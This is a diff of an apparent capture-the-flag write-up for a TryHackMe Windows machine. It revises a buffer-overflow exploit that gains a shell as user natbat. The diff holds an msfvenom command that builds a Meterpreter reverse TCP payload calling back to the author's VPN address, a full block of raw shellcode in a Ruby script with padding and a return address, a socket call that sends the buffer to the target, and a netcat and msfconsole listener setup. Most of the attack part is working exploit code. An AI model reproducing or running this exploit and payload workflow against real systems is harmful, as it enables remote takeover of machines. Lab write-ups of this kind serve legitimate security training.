@@ -1,6 +1,6 @@
 Now, we have a working template in both Python and Ruby, we can choose either one of them. I am using the final Ruby template for the actual show. However, first we need to create a new payload by using the IP address on THM:
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=10.9.87.151 LPORT=6000 -f rb -a x86 --platform windows -b "\x00\x0A"
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.87.151 LPORT=6000 -f rb -a x86 --platform windows -b "\x00\x0A"
 ```
 Couple of things to note here. LHOST has my IP when I connect to THM via openvpn, you can find that out by running:
 ```bash
@@ -13,34 +13,35 @@ And look for ```tun0``` device. You also notice that I am using a different port
 buff = "A"*146
 buff += "\xc3\x14\x04\x08"
 buff += "\x90"*8
-buff += "\xda\xd4\xbf\x37\xf4\x5a\xb9\xd9\x74\x24\xf4\x5a\x2b\xc9" +                                                                                                            
-"\xb1\x52\x31\x7a\x17\x83\xc2\x04\x03\x4d\xe7\xb8\x4c\x4d" +                                                                                                            
-"\xef\xbf\xaf\xad\xf0\xdf\x26\x48\xc1\xdf\x5d\x19\x72\xd0" +                                                                                                            
-"\x16\x4f\x7f\x9b\x7b\x7b\xf4\xe9\x53\x8c\xbd\x44\x82\xa3" +                                                                                                            
-"\x3e\xf4\xf6\xa2\xbc\x07\x2b\x04\xfc\xc7\x3e\x45\x39\x35" +                                                                                                            
-"\xb2\x17\x92\x31\x61\x87\x97\x0c\xba\x2c\xeb\x81\xba\xd1" +                                                                                                            
-"\xbc\xa0\xeb\x44\xb6\xfa\x2b\x67\x1b\x77\x62\x7f\x78\xb2" +                                                                                                            
-"\x3c\xf4\x4a\x48\xbf\xdc\x82\xb1\x6c\x21\x2b\x40\x6c\x66" +                                                                                                            
-"\x8c\xbb\x1b\x9e\xee\x46\x1c\x65\x8c\x9c\xa9\x7d\x36\x56" +                                                                                                            
-"\x09\x59\xc6\xbb\xcc\x2a\xc4\x70\x9a\x74\xc9\x87\x4f\x0f" +                                                                                                            
-"\xf5\x0c\x6e\xdf\x7f\x56\x55\xfb\x24\x0c\xf4\x5a\x81\xe3" +
-"\x09\xbc\x6a\x5b\xac\xb7\x87\x88\xdd\x9a\xcf\x7d\xec\x24" +
-"\x10\xea\x67\x57\x22\xb5\xd3\xff\x0e\x3e\xfa\xf8\x71\x15" +
-"\xba\x96\x8f\x96\xbb\xbf\x4b\xc2\xeb\xd7\x7a\x6b\x60\x27" +
-"\x82\xbe\x27\x77\x2c\x11\x88\x27\x8c\xc1\x60\x2d\x03\x3d" +
-"\x90\x4e\xc9\x56\x3b\xb5\x9a\x52\xb5\xe2\xcd\x0b\xc7\x0c" +
-"\xe5\xbb\x4e\xea\x63\x2c\x07\xa5\x1b\xd5\x02\x3d\xbd\x1a" +
-"\x99\x38\xfd\x91\x2e\xbd\xb0\x51\x5a\xad\x25\x92\x11\x8f" +
-"\xe0\xad\x8f\xa7\x6f\x3f\x54\x37\xf9\x5c\xc3\x60\xae\x93" +
-"\x1a\xe4\x42\x8d\xb4\x1a\x9f\x4b\xfe\x9e\x44\xa8\x01\x1f" +
-"\x08\x94\x25\x0f\xd4\x15\x62\x7b\x88\x43\x3c\xd5\x6e\x3a" +
-"\x8e\x8f\x38\x91\x58\x47\xbc\xd9\x5a\x11\xc1\x37\x2d\xfd" +
-"\x70\xee\x68\x02\xbc\x66\x7d\x7b\xa0\x16\x82\x56\x60\x26" +
-"\xc9\xfa\xc1\xaf\x94\x6f\x50\xb2\x26\x5a\x97\xcb\xa4\x6e" +
-"\x68\x28\xb4\x1b\x6d\x74\x72\xf0\x1f\xe5\x17\xf6\x8c\x06" +
-"\x32"
+buff += "\xbb\x9d\x8a\xad\x59\xda\xc5\xd9\x74\x24\xf4\x5d\x33\xc9" +
+"\xb1\x56\x83\xc5\x04\x31\x5d\x0f\x03\x5d\x92\x68\x58\xa5" +
+"\x44\xee\xa3\x56\x94\x8f\x2a\xb3\xa5\x8f\x49\xb7\x95\x3f" +
+"\x19\x95\x19\xcb\x4f\x0e\xaa\xb9\x47\x21\x1b\x77\xbe\x0c" +
+"\x9c\x24\x82\x0f\x1e\x37\xd7\xef\x1f\xf8\x2a\xf1\x58\xe5" +
+"\xc7\xa3\x31\x61\x75\x54\x36\x3f\x46\xdf\x04\xd1\xce\x3c" +
+"\xdc\xd0\xff\x92\x57\x8b\xdf\x15\xb4\xa7\x69\x0e\xd9\x82" +
+"\x20\xa5\x29\x78\xb3\x6f\x60\x81\x18\x4e\x4d\x70\x60\x96" +
+"\x69\x6b\x17\xee\x8a\x16\x20\x35\xf1\xcc\xa5\xae\x51\x86" +
+"\x1e\x0b\x60\x4b\xf8\xd8\x6e\x20\x8e\x87\x72\xb7\x43\xbc" +
+"\x8e\x3c\x62\x13\x07\x06\x41\xb7\x4c\xdc\xe8\xee\x28\xb3" +
+"\x15\xf0\x93\x6c\xb0\x7a\x39\x78\xc9\x20\x55\x4d\xe0\xda" +                                                                                                            
+"\xa5\xd9\x73\xa8\x97\x46\x28\x26\x9b\x0f\xf6\xb1\xaa\x18" +                                                                                                            
+"\x09\x6d\x14\x48\xf7\x8e\x64\x40\x3c\xda\x34\xfa\x95\x63" +                                                                                                            
+"\xdf\xfa\x1a\xb6\x75\xf1\x8c\x33\x80\x52\xda\x2c\x90\x5c" +                                                                                                            
+"\xf3\xdc\x1d\xba\xab\x4c\x4d\x13\x0c\x3d\x2d\xc3\xe4\x57" +                                                                                                            
+"\xa2\x3c\x14\x58\x69\x55\xbf\xb7\xc7\x0d\x28\x21\x42\xc5" +                                                                                                            
+"\xc9\xae\x59\xa3\xca\x25\x6b\x53\x84\xcd\x1e\x47\xf1\xa9" +                                                                                                            
+"\xe0\x97\x02\x5c\xe0\xfd\x06\xf6\xb7\x69\x05\x2f\xff\x35" +                                                                                                            
+"\xf6\x1a\x7c\x31\x08\xdb\xb4\x49\x3f\x49\xf8\x25\x40\x9d" +                                                                                                            
+"\xf8\xb5\x16\xf7\xf8\xdd\xce\xa3\xab\xf8\x10\x7e\xd8\x50" +                                                                                                            
+"\x85\x81\x88\x05\x0e\xea\x36\x73\x78\xb5\xc9\x56\xfa\xb2" +                                                                                                            
+"\x35\x24\xd5\x1a\x5d\xd6\x65\x9b\x9d\xbc\x65\xcb\xf5\x4b" +                                                                                                            
+"\x49\xe4\x35\xb3\x40\xad\x5d\x3e\x05\x1f\xfc\x3f\x0c\xc1" +                                                                                                            
+"\xa0\x40\xa3\xda\x53\x3a\xcc\xdd\x94\xbb\xc4\xb9\x95\xbb" +                                                                                                            
+"\xe8\xbf\xaa\x6d\xd1\xb5\xed\xad\x66\xc5\x58\x93\xcf\x4c" +                                                                                                            
+"\xa2\x87\x10\x45"
 
-RHOST = "10.10.110.117"
+RHOST = "10.10.64.5"
 RPORT = 31337
 
 
@@ -48,9 +49,13 @@ require 'socket'
 
 TCPSocket.open(RHOST,RPORT){ |s| s.puts buff}
 ```
-Before running our Ruby script, let's start our netcat listener ```bash nc -nlvp 6000``` and let's fire away our Ruby script ```ruby shellcode.rb```
+Before running our Ruby script, let's start msfconsole and set up our handler with the payload and run it in the background:
 
-![Final Reverseshell](finalReverseshell.png)
+![Msf Payload](msfconsole.png)
+
+Now, it is time to fire away our Ruby script ```ruby shellcode.rb```
+
+![Final Reverseshell](finalReverseshell2.png)
 
 Nice, we are now in the machine as natbat user. Next, we'll look for some information...
 
